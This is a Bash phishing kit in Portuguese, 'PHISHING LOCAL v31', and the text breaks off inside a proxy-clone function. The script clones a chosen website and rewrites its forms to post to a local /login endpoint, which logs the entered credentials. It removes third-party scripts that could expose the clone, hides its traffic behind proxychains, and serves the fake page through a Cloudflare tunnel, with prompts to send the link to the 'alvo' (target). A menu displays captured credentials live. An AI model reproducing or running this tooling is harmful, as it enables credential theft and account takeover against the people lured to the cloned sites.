#!/bin/bash
# ============================================
# 🎣 PHISHING LOCAL v31 - Clonador Profissional
# 1 Phish 2 Capturas 3 Túnel 4 Histórico 5 Parar 0 Sair
# ============================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; PURPLE='\033[0;35m'; WHITE='\033[1;37m'; NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# Verificar se existe o server.js
if [ ! -f "$SCRIPT_DIR/server/server.js" ]; then
    echo -e "${RED}[ERRO] server.js não encontrado em $SCRIPT_DIR/server/${NC}"
    echo -e "${YELLOW}Verifique se o arquivo existe e rode novamente.${NC}"
    exit 1
fi
SITE_DIR="$SCRIPT_DIR/site_clone"
LOG_FILE="$SCRIPT_DIR/capturas.txt"
CAPTURED_DIR="$SCRIPT_DIR/captured_sites"

mkdir -p "$CAPTURED_DIR" "$SITE_DIR"

# =============================================
# VERIFICAR NODE.JS
# =============================================
if ! command -v node &>/dev/null; then
    echo -e "${YELLOW}[...] Node.js não encontrado. Instalando...${NC}"
    pkg install -y nodejs 2>/dev/null || {
        echo -e "${RED}[ERRO] Falha ao instalar Node.js. Instale manualmente:${NC}"
        echo -e "${WHITE}  pkg install nodejs${NC}"
        exit 1
    }
fi

# =============================================
# OBTER IP AUTOMÁTICO
# =============================================
get_my_ip() {
    local ip=""
    ip=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    if [ -z "$ip" ]; then
        ip=$(ip addr 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
    fi
    [ -z "$ip" ] && ip="127.0.0.1"
    echo "$ip"
}

# =============================================
# CLONAR SITE - BAIXA TUDO, MANTEM ORIGINAL
# =============================================
clone_site() {
    local target_url="$1"
    local redirect_url="$2"
    local port="${3:-8080}"

    rm -rf "$SITE_DIR"/*

    # curl com proxychains se disponível e configurado (ou se PROXY_CHAINS_CONF setado)
    local curl_cmd="curl"
    local curl_opts="-s -L -k --connect-timeout 20 --max-time 60"
    local proxychains_conf="${PROXY_CHAINS_CONF:-}"
    if [ -z "$proxychains_conf" ]; then
        if [ -f "$HOME/.proxychains/proxychains.conf" ]; then
            proxychains_conf="$HOME/.proxychains/proxychains.conf"
        elif [ -f "/data/data/com.termux/files/home/.proxychains/proxychains.conf" ]; then
            proxychains_conf="/data/data/com.termux/files/home/.proxychains/proxychains.conf"
        fi
    fi
    if command -v proxychains4 &>/dev/null && [ -n "$proxychains_conf" ]; then
        curl_cmd="proxychains4 -f $proxychains_conf curl"
        echo -e "${GREEN}[ProxyChains ativo]${NC}"
    else
        echo -e "${YELLOW}[Sem proxy — direto]${NC}"
    fi

    # Detectar redirect: pega a URL final após redirects
    local final_url=$($curl_cmd -sI -L -k --connect-timeout 15 "$target_url" 2>/dev/null | grep -i "^location:" | tail -1 | sed 's/location: //i' | tr -d '
')
    if [ -n "$final_url" ] && ! echo "$final_url" | grep -q "^$target_url"; then
        echo -e "${YELLOW}[Redirect detectado: $final_url${NC}"
        target_url="$final_url"
        # Extrair novo domínio base
        base_domain=$(echo "$target_url" | sed -E 's|(https?://[^/]+).*|\1|')
    fi

    local ua="Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
    local accept="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    local lang="pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7"

    # 1. Baixar HTML principal (com delay pra esperar redirect/carregar)
    echo -e "${YELLOW}[1/4] Baixando HTML (aguardando carregar)...${NC}"
    sleep 3
    $curl_cmd $curl_opts -H "$ua" -H "Accept: $accept" -H "Accept-Language: $lang" -H "Accept-Encoding: identity" -o "$SITE_DIR/index.html" "$target_url" > "$SCRIPT_DIR/curl.log" 2>&1

    if [ ! -s "$SITE_DIR/index.html" ]; then
        echo -e "${RED}[ERRO] Falha ao baixar o site.${NC}"
        cat "$SCRIPT_DIR/curl.log" 2>/dev/null
        return 1
    fi
    local html_size=$(wc -c < "$SITE_DIR/index.html")
    echo -e "${GREEN}  → ${html_size} bytes${NC}"
    if [ "$html_size" -lt 5000 ]; then
        echo -e "${YELLOW}  ⚠ HTML muito pequeno — site pode ser 100% JS (React/Vue).${NC}"
        echo -e "${YELLOW}    Resultado pode ficar sem estilo ou branco.${NC}"
    fi

    # Extrair domínio base
    local base_domain=$(echo "$target_url" | sed -E 's|(https?://[^/]+).*|\1|')

    # 2. Baixar CSS — pega todos <link rel="stylesheet"> e também href com .css
    echo -e "${YELLOW}[2/4] Baixando CSS...${NC}"
    local css_count=0
    local css_list_file="$SCRIPT_DIR/.css_list"
    # Pegar todos os links de CSS (qualquer href que contenha .css)
    grep -oE 'href="[^"]*\.css[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//' | sort -u > "$css_list_file"
    # Também pegar <link> com href que NÃO termina em .css mas é CSS (style.min, etc)
    grep -oE '<link[^>]*href="[^"]*"[^>]*>' "$SITE_DIR/index.html" 2>/dev/null | grep -iE "stylesheet|text/css|content=\"style" | sed -n 's/.*href="\([^"]*\)".*/\1/p' | sort -u >> "$css_list_file"
    # Duplicatas
    sort -u "$css_list_file" -o "$css_list_file"
    while IFS= read -r css_url; do
        [ -z "$css_url" ] && continue
        local css_file="css_${css_count}_$(basename "$css_url" | sed 's/[^a-zA-Z0-9._-]/_/g' | cut -c1-50)"
        local css_abs=""
        if echo "$css_url" | grep -q "^http"; then
            css_abs="$css_url"
        elif echo "$css_url" | grep -q "^//"; then
            css_abs="https:$css_url"
        elif echo "$css_url" | grep -q "^/"; then
            css_abs="${base_domain}${css_url}"
        else
            css_abs="${base_domain}/${css_url}"
        fi
        $curl_cmd $curl_opts -o "$SITE_DIR/$css_file" "$css_abs" >> "$SCRIPT_DIR/curl.log" 2>&1
        # Trocar no HTML usando perl (literal, sem regex issues)
        perl -i -pe "s|\Q${css_url}\E|${css_file}|g" "$SITE_DIR/index.html"
        # Também substituir versão absoluta
        local abs1="${base_domain}${css_url}";
        [ "$abs1" != "$css_url" ] && perl -i -pe "s|\Q${abs1}\E|${css_file}|g" "$SITE_DIR/index.html"
        css_count=$((css_count + 1))
    done < "$css_list_file"
    rm -f "$css_list_file"
    echo -e "${GREEN}  → ${css_count} CSS baixados${NC}"

    # 3. Baixar JS — pega src="..." com .js
    echo -e "${YELLOW}[3/4] Baixando JS...${NC}"
    local js_count=0
    local js_list_file="$SCRIPT_DIR/.js_list"
    grep -oE 'src="[^"]*\.js[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//' > "$js_list_file"
    # Também URLs relativos (src="//...")
    grep -oE 'src="//[^"]*\.js[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//|https://|' >> "$js_list_file"
    sort -u "$js_list_file" -o "$js_list_file"
    while IFS= read -r js_url; do
        [ -z "$js_url" ] && continue
        local js_file="js_${js_count}_$(basename "$js_url" | sed 's/[^a-zA-Z0-9._-]/_/g' | cut -c1-40)"
        local js_abs=""
        if echo "$js_url" | grep -q "^http"; then
            js_abs="$js_url"
        elif echo "$js_url" | grep -q "^//"; then
            js_abs="https:$js_url"
        elif echo "$js_url" | grep -q "^/"; then
            js_abs="${base_domain}${js_url}"
        else
            js_abs="${base_domain}/${js_url}"
        fi
        $curl_cmd $curl_opts -o "$SITE_DIR/$js_file" "$js_abs" >> "$SCRIPT_DIR/curl.log" 2>&1
        # Trocar no HTML usando perl (literal)
        perl -i -pe "s|\Q${js_url}\E|${js_file}|g" "$SITE_DIR/index.html"
        js_count=$((js_count + 1))
    done < "$js_list_file"
    rm -f "$js_list_file"
    echo -e "${GREEN}  → ${js_count} JS baixados${NC}"

    # 4. Modificar formulários pra captura
    echo -e "${YELLOW}[4/4] Configurando captura...${NC}"
    local my_ip=$(get_my_ip)
    local local_url="http://${my_ip}:${port}"

    # Capturar action original e redirecionar pra /login
    sed -i 's/action="[^"]*"/action="\/login"/gI' "$SITE_DIR/index.html"
    # Garantir method POST
    sed -i 's/<form\b/<form method="POST" action="\/login"/gI' "$SITE_DIR/index.html"
    # Extrair domínios do site pra trocar todos
    local domain_plain=$(echo "$base_domain" | sed 's|https\?://||')
    local domain_www="www.${domain_plain}"

    # 3.5 Baixar recursos do CDN (imagens, fonts, webp, etc)
    echo -e "${YELLOW}[3.5] Baixando recursos do CDN...${NC}"
    local asset_count=0
    > "$SCRIPT_DIR/.assets_list"
    # Assets com https:// em atributos src/href
    grep -oE '(src|href|action)="https?://[^"]*\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | cut -d'"' -f2 >> "$SCRIPT_DIR/.assets_list"
    # URLs relativos com //
    grep -oE '"//[^"]*\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | cut -c3- >> "$SCRIPT_DIR/.assets_list"
    # Do CSS
    for css_file in "$SITE_DIR"/css_*.css; do
        [ -f "$css_file" ] || continue
        grep -oE 'url\([^)]*\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)[^)]*\)' "$css_file" 2>/dev/null | sed 's/url(//;s/).*//;s/#.*//;s/["'"'"' ]//g' >> "$SCRIPT_DIR/.assets_list"
    done
    sort -u "$SCRIPT_DIR/.assets_list" > "$SCRIPT_DIR/.assets_list_sorted"
    while IFS= read -r asset_url; do
        asset_url=$(echo "$asset_url" | sed 's|"||g')
        [ -z "$asset_url" ] && continue
        local asset_file="asset_${asset_count}_$(basename "$asset_url" | sed 's/[^a-zA-Z0-9._-]/_/g' | cut -c1-50)"
        $curl_cmd -s -o "$SITE_DIR/$asset_file" "$asset_url" >> "$SCRIPT_DIR/curl.log" 2>&1
        # Substituir URL pelo arquivo local
        perl -i -pe "s|\Q${asset_url}\E|${asset_file}|g" "$SITE_DIR/index.html"
        asset_count=$((asset_count + 1))
    done < "$SCRIPT_DIR/.assets_list_sorted"
    rm -f "$SCRIPT_DIR/.assets_list" "$SCRIPT_DIR/.assets_list_sorted"
    echo -e "${GREEN}  → ${asset_count} assets baixados${NC}"

    # Trocar URLs do domínio original pelo IP local (perl pra ser literal)
    perl -i -pe "s|${base_domain}|${local_url}|g" "$SITE_DIR/index.html"
    # Trocar www.dominio.com e dominio.com (com e sem https)
    perl -i -pe "s|https://${domain_plain}|${local_url}|g" "$SITE_DIR/index.html"
    perl -i -pe "s|http://${domain_plain}|${local_url}|g" "$SITE_DIR/index.html"
    perl -i -pe "s|https://${domain_www}|${local_url}|g" "$SITE_DIR/index.html"
    perl -i -pe "s|http://${domain_www}|${local_url}|g" "$SITE_DIR/index.html"
    # Trocar URLs que começam com // (protocol-relative)
    perl -i -pe "s|//${domain_plain}/|${local_url}/|g" "$SITE_DIR/index.html"
    perl -i -pe "s|//${domain_www}/|${local_url}/|g" "$SITE_DIR/index.html"
    # Trocar CDN (ex: static.cdninstagram.com, cdn.site.com) — substituição literal
    local cdn_domains=$(grep -oE 'https://[^./]+\.[^./]+\.com' "$SITE_DIR/index.html" 2>/dev/null | sort -u)
    for cdn in $cdn_domains; do
        local cdn_host=$(echo "$cdn" | sed 's|https\?://||')
        perl -i -pe "s|\Q//${cdn_host}\E|${local_url}|g" "$SITE_DIR/index.html"
        perl -i -pe "s|\Q${cdn_host}\E|${local_url}|g" "$SITE_DIR/index.html"
        for css_file in "$SITE_DIR"/css_*.css; do
            [ -f "$css_file" ] || continue
            perl -i -pe "s|\Q//${cdn_host}\E|${local_url}|g" "$css_file"
            perl -i -pe "s|\Q${cdn_host}\E|${local_url}|g" "$css_file"
        done
    done
    # Remover integrações externas que denunciam clone
    sed -i 's/<script[^>]*src="https:\/\/connect\.facebook\.net[^"]*"[^>]*><\/script>//gI' "$SITE_DIR/index.html"
    sed -i 's/<script[^>]*src="https:\/\/platform\.twitter\.com[^"]*"[^>]*><\/script>//gI' "$SITE_DIR/index.html"
    # Corrigir http -> https reverso (mixed content)
    sed -i "s|http://${my_ip}|${local_url}|gI" "$SITE_DIR/index.html"

    echo -e "${GREEN}  → Formulários hackeados, URLs trocadas${NC}"

    # Salvar no histórico
    local site_name=$(echo "$target_url" | sed -E 's|https?://||;s|[^a-zA-Z0-9.]|_|g')
    local ts=$(date +%Y%m%d_%H%M)
    local hist_dir="$CAPTURED_DIR/${site_name}_${ts}"
    mkdir -p "$hist_dir"
    cp -r "$SITE_DIR"/* "$hist_dir"/ 2>/dev/null

    # Salvar no histórico (arquivo)
    echo "${target_url}|${redirect_url}|${port}|$(date '+%Y-%m-%d %H:%M')|$hist_dir" >> "$SCRIPT_DIR/.history"

    echo ""
    echo -e "  ✅ CLONE REALIZADO!"
    echo -e "  📍 http://${my_ip}:${port}"

    # Matar qualquer processo na porta antes de iniciar
    echo -e "${YELLOW}[...] Iniciando servidor na porta $port...${NC}"
    # Matar node antigo por nome
    pkill -9 -f "node.*server.js" 2>/dev/null
    sleep 1
    # Matar qualquer coisa na porta (tentar fuser)
    if command -v fuser &>/dev/null; then
        fuser -k "$port/tcp" 2>/dev/null
    elif command -v lsof &>/dev/null; then
        local old_pid=$(lsof -ti :$port 2>/dev/null)
        [ -n "$old_pid" ] && kill -9 $old_pid 2>/dev/null
    elif command -v netstat &>/dev/null; then
        local old_pid=$(netstat -tlnp 2>/dev/null | grep ":$port " | grep -oE '[0-9]+/node' | cut -d/ -f1)
        [ -n "$old_pid" ] && kill -9 $old_pid 2>/dev/null
    fi
    sleep 1

    cd "$SCRIPT_DIR"
    REDIRECT_URL="$redirect_url" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
    local pid=$!
    echo "$pid" > "$SCRIPT_DIR/.server.pid"
    sleep 3

    # Verificar se subiu
    if kill -0 "$pid" 2>/dev/null; then
        echo -e "${GREEN}[✓] Servidor rodando! PID: $pid${NC}"
        echo -e "${GREEN}[✓] Acesse: http://${my_ip}:${port}${NC}"
    else
        echo -e "${RED}[ERRO] Servidor não subiu. Log:${NC}"
        cat "$SCRIPT_DIR/server.log" 2>/dev/null
        rm -f "$SCRIPT_DIR/.server.pid"
    fi

    echo ""
    echo -e "${YELLOW}Pressione Enter para voltar ao menu...${NC}"
    read
}

# =============================================
# VER CAPTURAS - TEMPO REAL
# =============================================
view_captures() {
    clear
    echo -e "  ═══ 📋 CREDENCIAIS CAPTURADAS ═══"
    echo ""

    if [ ! -f "$LOG_FILE" ] || [ ! -s "$LOG_FILE" ]; then
        echo -e "${RED}  Nenhuma captura ainda.${NC}"
    else
        echo -e "${WHITE}═══════════════════════════════════════════${NC}"
        cat "$LOG_FILE"
        echo -e "${WHITE}═══════════════════════════════════════════${NC}"
        echo -e "${GREEN}  $(wc -l < "$LOG_FILE" | tr -d ' ') captura(s)${NC}"
    fi

    echo ""
    echo -e "${YELLOW}1) Limpar capturas${NC}"
    echo -e "${YELLOW}2) Tempo real (Ctrl+C = voltar)${NC}"
    echo -e "${YELLOW}Enter) Voltar${NC}"
    echo -n "> "
    read CHOICE

    case $CHOICE in
        1)
            > "$LOG_FILE"
            echo -e "${GREEN}[✓] Limpo.${NC}"
            echo -e "${YELLOW}Enter...${NC}"
            read
            ;;
        2)
            echo -e "${CYAN}(Ctrl+C pra voltar)${NC}"
            tail -n 5 -f "$LOG_FILE" 2>/dev/null || true
            ;;
    esac
}

# =============================================
# TÚNEL CLOUDFLARED
# =============================================
start_tunnel() {
    clear
    echo -e "  ═══ 🌐 TÚNEL PÚBLICO ═══"
    echo ""

    # Verificar servidor
    if [ ! -f "$SCRIPT_DIR/.server.pid" ]; then
        echo -e "${RED}  Servidor não está rodando! Faça phish primeiro.${NC}"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local pid=$(cat "$SCRIPT_DIR/.server.pid" 2>/dev/null)
    if ! kill -0 "$pid" 2>/dev/null; then
        echo -e "${RED}  Servidor parou. Faça phish de novo.${NC}"
        rm -f "$SCRIPT_DIR/.server.pid"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local port=$(grep 'PORT=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)
    [ -z "$port" ] && port=8080

    # Verificar cloudflared
    if ! command -v cloudflared &>/dev/null; then
        echo -e "${YELLOW}  cloudflared não encontrado. Instale:${NC}"
        echo -e "${WHITE}  pkg install cloudflared${NC}"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    # Parar túnel anterior
    if [ -f "$SCRIPT_DIR/.tunnel.pid" ]; then
        kill $(cat "$SCRIPT_DIR/.tunnel.pid") 2>/dev/null
        rm -f "$SCRIPT_DIR/.tunnel.pid"
    fi
    pkill -f cloudflared 2>/dev/null
    sleep 1

    echo -e "${YELLOW}[...] Iniciando túnel na porta $port...${NC}"

    # Criar tunnel em background
    cloudflared tunnel --url "http://localhost:$port" > "$SCRIPT_DIR/.tunnel.log" 2>&1 &
    local tunnel_pid=$!
    echo "$tunnel_pid" > "$SCRIPT_DIR/.tunnel.pid"
    sleep 6

    # Capturar URL
    local tunnel_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' "$SCRIPT_DIR/.tunnel.log" 2>/dev/null | head -1)

    if [ -n "$tunnel_url" ] && [ "$tunnel_url" != "" ]; then
        echo -e "  🌐 PRONTO!"
        echo -e "  📍 $tunnel_url"
        echo ""
        echo -e "  💡 Mande pro alvo nesse link!"
    else
        echo -e "${YELLOW}  Túnel iniciado (demora alguns segundos).${NC}"
        echo -e "${YELLOW}  Verifique: cat $SCRIPT_DIR/.tunnel.log${NC}"
    fi

    echo ""
    echo -e "${YELLOW}1) Parar${NC}"
    echo -e "${YELLOW}Enter) Voltar${NC}"
    echo -n "> "
    read CHOICE

    if [ "$CHOICE" = "1" ]; then
        [ -f "$SCRIPT_DIR/.tunnel.pid" ] && kill $(cat "$SCRIPT_DIR/.tunnel.pid") 2>/dev/null
        rm -f "$SCRIPT_DIR/.tunnel.pid"
        pkill -f cloudflared 2>/dev/null
        echo -e "${GREEN}[✓] Parado.${NC}"
    fi
}

# =============================================
# HISTÓRICO
# =============================================
show_history() {
    clear
    echo -e "  ═══ 📜 HISTÓRICO ═══"
    echo ""

    if [ ! -f "$SCRIPT_DIR/.history" ] || [ ! -s "$SCRIPT_DIR/.history" ]; then
        echo -e "${RED}  Sem clones.${NC}"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local count=0
    local all_urls=()
    local all_redirects=()
    local all_ports=()
    local all_dirs=()
    while IFS='|' read -r url redirect port timestamp dir; do
        count=$((count + 1))
        all_urls+=("$url")
        all_redirects+=("$redirect")
        all_ports+=("$port")
        all_dirs+=("$dir")
        echo -e "  ${GREEN}[$count]${NC} ${WHITE}$url${NC} ($timestamp)"
    done < "$SCRIPT_DIR/.history"

    [ "$count" -eq 0 ] && return

    echo ""
    echo -e "  ${RED}[0]${NC} Voltar"
    echo -n "Escolha: "
    read CHOICE

    [ "$CHOICE" = "0" ] && return

    if [ "$CHOICE" -gt 0 ] 2>/dev/null && [ "$CHOICE" -le "$count" ]; then
        local idx=$((CHOICE - 1))
        echo ""
        echo -e "${GREEN}  ${all_urls[$idx]}${NC}"
        echo ""
        echo -e "${YELLOW}1) Reusar${NC}"
        echo -e "${YELLOW}2) Atualizar${NC}"
        echo -e "${YELLOW}Enter) Voltar${NC}"
        echo -n "> "
        read ACT

        [ -z "$ACT" ] && return

        if [ "$ACT" = "1" ]; then
            rm -rf "$SITE_DIR"/*
            cp -r "${all_dirs[$idx]}"/* "$SITE_DIR"/ 2>/dev/null
            # Atualizar IP
            local my_ip=$(get_my_ip)
            local port="${all_ports[$idx]}"
            sed -i "s|http://[0-9.]*:[0-9]*|http://${my_ip}:${port}|g" "$SITE_DIR/index.html"
            cd "$SCRIPT_DIR"
            REDIRECT_URL="${all_redirects[$idx]}" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" nohup node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
            echo "$!" > "$SCRIPT_DIR/.server.pid"
            echo -e "${GREEN}[✓] Servidor em http://${my_ip}:${port}${NC}"
        elif [ "$ACT" = "2" ]; then
            clone_site "${all_urls[$idx]}" "${all_redirects[$idx]}" "${all_ports[$idx]}"
        fi
    fi
}

# =============================================
# LOCALHOST - Mostrar IP e porta
# =============================================
show_localhost() {
    clear
    echo -e "  ═══ 📍 SERVIDOR LOCAL ═══"
    echo ""

    if [ ! -f "$SCRIPT_DIR/.server.pid" ]; then
        echo -e "${RED}  Servidor OFF.${NC}"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local pid=$(cat "$SCRIPT_DIR/.server.pid" 2>/dev/null)
    if ! kill -0 "$pid" 2>/dev/null; then
        echo -e "${RED}  Servidor OFF (PID parou).${NC}"
        rm -f "$SCRIPT_DIR/.server.pid"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local port=$(grep 'PORT=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)
    local my_ip=$(get_my_ip)
    local target=$(grep 'TARGET_URL=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)
    local redirect=$(grep 'REDIRECT_URL=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)

    [ -z "$port" ] && port=8080

    echo -e "  ${GREEN}Status:${NC}  ${WHITE}ON ✓${NC}"
    echo -e "  ${GREEN}PID:${NC}     ${WHITE}$pid${NC}"
    echo -e "  ${GREEN}IP:${NC}      ${WHITE}$my_ip${NC}"
    echo -e "  ${GREEN}Porta:${NC}   ${WHITE}$port${NC}"
    echo -e "  ${GREEN}URL:${NC}     ${WHITE}http://${my_ip}:${port}${NC}"
    echo -e "  ${GREEN}Alvo:${NC}    ${WHITE}$target${NC}"
    echo -e "  ${GREEN}Redirect:${NC} ${WHITE}$redirect${NC}"
    echo ""
    echo -e "${YELLOW}Enter...${NC}"
    read
}

# =============================================
# LINK DO TÚNEL
# =============================================
show_tunnel_link() {
    clear
    echo -e "  ═══ 🔗 LINK DO TÚNEL ═══"
    echo ""

    if [ ! -f "$SCRIPT_DIR/.tunnel.log" ] || [ ! -s "$SCRIPT_DIR/.tunnel.log" ]; then
        echo -e "${RED}  Túnel não está rodando.${NC}"
        echo -e "${YELLOW}  Crie o túnel primeiro (opção 3).${NC}"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local tunnel_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' "$SCRIPT_DIR/.tunnel.log" 2>/dev/null | head -1)

    if [ -n "$tunnel_url" ] && [ "$tunnel_url" != "" ]; then
        echo -e "  🌐 LINK PÚBLICO:"
        echo -e "  📍 $tunnel_url"
        echo ""
        echo -e "  💡 Manda esse link pro alvo!"
    else
        echo -e "${YELLOW}  Túnel rodando mas link não capturado ainda.${NC}"
        echo -e "${YELLOW}  Verifique: cat $SCRIPT_DIR/.tunnel.log${NC}"
    fi

    echo ""
    echo -e "${YELLOW}1) Recriar túnel${NC}"
    echo -e "${YELLOW}Enter) Voltar${NC}"
    echo -n "> "
    read CHOICE

    if [ "$CHOICE" = "1" ]; then
        start_tunnel
    fi
}
show_status() {
    clear
    echo -e "  ═══ 📊 STATUS DO SISTEMA ═══"
    echo ""

    # Node.js
    echo -n "  ${YELLOW}Node.js:${NC}         "
    if command -v node &>/dev/null; then
        echo -e "${GREEN}✓ $(node --version 2>/dev/null)${NC}"
    else
        echo -e "${RED}✗ Não instalado${NC}"
    fi

    # curl
    echo -n "  ${YELLOW}Curl:${NC}            "
    if command -v curl &>/dev/null; then
        echo -e "${GREEN}✓${NC}"
    else
        echo -e "${RED}✗${NC}"
    fi

    # Proxychains
    echo -n "  ${YELLOW}ProxyChains:${NC}      "
    if command -v proxychains4 &>/dev/null; then
        echo -e "${GREEN}✓${NC}"
    else
        echo -e "${YELLOW}○ Não instalado (opcional)${NC}"
    fi

    # Cloudflared
    echo -n "  ${YELLOW}Cloudflared:${NC}      "
    if command -v cloudflared &>/dev/null; then
        echo -e "${GREEN}✓${NC}"
    else
        echo -e "${RED}✗ Não instalado (opcional)${NC}"
    fi

    # grep -oE
    echo -n "  ${YELLOW}Grep -oE:${NC}        "
    if echo "test" | grep -qe "test" 2>/dev/null; then
        echo -e "${GREEN}✓${NC}"
    else
        echo -e "${RED}✗ (problema!)${NC}"
    fi

    echo ""
    echo -e "  ${PURPLE}──── Processos ────${NC}"

    # Servidor — verificar PID E processo node vivo
    echo -n "  ${YELLOW}Servidor:${NC}         "
    local alive=0
    if [ -f "$SCRIPT_DIR/.server.pid" ]; then
        local pid=$(cat "$SCRIPT_DIR/.server.pid")
        if kill -0 "$pid" 2>/dev/null; then
            echo -e "${GREEN}✓ Rodando (PID: $pid)${NC}"
            alive=1
        else
            echo -e "${RED}✗ PID $pid parou${NC}"
        fi
    fi
    # Mesmo sem PID, verificar se node tá rodando
    if [ "$alive" = "0" ]; then
        local node_pids=$(pgrep -f "node.*server" 2>/dev/null)
        if [ -n "$node_pids" ]; then
            echo -e "${GREEN}    → Node vivo: $node_pids (sem PID file)${NC}"
            alive=1
        else
            echo -e "${RED}✗ Desligado${NC}"
        fi
    fi

    # Túnel
    echo -n "  ${YELLOW}Túnel:${NC}            "
    local tun_alive=0
    if [ -f "$SCRIPT_DIR/.tunnel.pid" ]; then
        local pid=$(cat "$SCRIPT_DIR/.tunnel.pid")
        if kill -0 "$pid" 2>/dev/null; then
            echo -e "${GREEN}✓ Rodando (PID: $pid)${NC}"
            tun_alive=1
        else
            echo -e "${RED}✗ PID $pid parou${NC}"
        fi
    fi
    if [ "$tun_alive" = "0" ] && pgrep -f cloudflared >/dev/null 2>&1; then
        echo -e "${GREEN}    → Cloudflared vivo (sem PID)${NC}"
    elif [ "$tun_alive" = "0" ]; then
        echo -e "${YELLOW}○ Desligado${NC}"
    fi

    local cap_count=0
    if [ -f "$LOG_FILE" ]; then
        cap_count=$(wc -l < "$LOG_FILE" 2>/dev/null)
    fi
    echo ""
    echo -e "  ${YELLOW}Capturas:${NC}        ${WHITE}$cap_count${NC}"

    echo ""
    echo -e "  ${PURPLE}──── Arquivos ────${NC}"

    if [ -f "$SCRIPT_DIR/server/server.js" ]; then
        local js_size=$(wc -c < "$SCRIPT_DIR/server/server.js" 2>/dev/null | tr -d ' ')
        echo -e "    ${GREEN}✓${NC} server/server.js (${js_size} bytes)"
    else
        echo -e "    ${RED}✗${NC} server/server.js"
    fi

    # clone_temp
    if [ -d "$SCRIPT_DIR/clone_temp" ]; then
        local tmp_count=$(ls "$SCRIPT_DIR/clone_temp" 2>/dev/null | wc -l)
        echo -e "    ${GREEN}✓${NC} clone_temp/ ($tmp_count arquivos)"
    fi

    # captured_sites
    if [ -d "$CAPTURED_DIR" ]; then
        local site_count=$(ls -d "$CAPTURED_DIR"/*/ 2>/dev/null | wc -l)
        echo -e "  ${YELLOW}Sites salvos:${NC}    ${WHITE}$site_count${NC}"
    fi

    echo ""
    echo -e "  ${PURPLE}──── Logs ────${NC}"

    # server.log — mostrar última linha se existir
    if [ -f "$SCRIPT_DIR/server.log" ]; then
        local log_size=$(wc -c < "$SCRIPT_DIR/server.log" 2>/dev/null | tr -d ' ')
        local last_line=$(tail -1 "$SCRIPT_DIR/server.log" 2>/dev/null)
        echo -e "  ${YELLOW}Server.log:${NC}      ${log_size} bytes"
        echo -e "    → ${last_line}"
    else
        echo -e "  ${YELLOW}Server.log:${NC}      ${RED}não existe${NC}"
    fi

    # curl.log — mostrar última linha se existir
    if [ -f "$SCRIPT_DIR/curl.log" ]; then
        local log_size=$(wc -c < "$SCRIPT_DIR/curl.log" 2>/dev/null | tr -d ' ')
        local last_line=$(tail -1 "$SCRIPT_DIR/curl.log" 2>/dev/null)
        echo -e "  ${YELLOW}Curl.log:${NC}        ${log_size} bytes"
        echo -e "    → ${last_line}"
    else
        echo -e "  ${YELLOW}Curl.log:${NC}        ${RED}não existe${NC}"
    fi

    if [ -f "$SCRIPT_DIR/.tunnel.log" ]; then
        local log_size=$(wc -c < "$SCRIPT_DIR/.tunnel.log" 2>/dev/null | tr -d ' ')
        local last_line=$(tail -1 "$SCRIPT_DIR/.tunnel.log" 2>/dev/null)
        echo -e "  ${YELLOW}Tunnel.log:${NC}      ${log_size} bytes"
        echo -e "    → ${last_line}"
    fi

    echo ""
    echo -e "${YELLOW}Enter para voltar...${NC}"
    read
}

stop_all() {
    if [ -f "$SCRIPT_DIR/.server.pid" ]; then
        local pid=$(cat "$SCRIPT_DIR/.server.pid")
        kill "$pid" 2>/dev/null
        rm -f "$SCRIPT_DIR/.server.pid"
    fi
    if [ -f "$SCRIPT_DIR/.tunnel.pid" ]; then
        local pid=$(cat "$SCRIPT_DIR/.tunnel.pid")
        kill "$pid" 2>/dev/null
        rm -f "$SCRIPT_DIR/.tunnel.pid"
    fi
    pkill -f "node.*server.js" 2>/dev/null
    pkill -f cloudflared 2>/dev/null
    echo -e "${GREEN}[✓] Tudo parado.${NC}"
}

# =============================================
# PROXY CLONE
# =============================================
do_proxy_clone() {
    clear
    echo -e "${PURPLE}═══ PROXY CLONE ═══${NC}"
    echo ""
    echo -e "${YELLOW}URL do site:${NC} "
    read URL
    [ -z "$URL" ] && return
    echo "$URL" | grep -q "^http" || URL="https://$URL"

